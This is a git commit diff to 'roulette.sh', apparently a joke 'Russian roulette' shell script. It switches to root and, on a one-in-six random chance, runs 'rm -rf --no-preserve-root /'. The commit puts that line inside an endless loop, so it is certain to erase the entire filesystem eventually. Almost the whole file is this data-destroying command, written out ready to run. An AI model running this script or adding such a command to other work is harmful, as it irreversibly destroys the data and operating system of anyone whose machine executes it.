4233cf525adee20ca116ea173596bea66956c28f
Wyatt <58761269+wyattboyer@users.noreply.github.com>
2023-01-07 18:07:37 -0500

    Update roulette.sh

--- roulette.sh
+++ roulette.sh
@@ -2,4 +2,8 @@
 # Wyatt Boyer - 2023
 # login as root
 su
-[ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root / || echo "click"
+while true
+do
+  [ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root /
+  echo "click"
+done
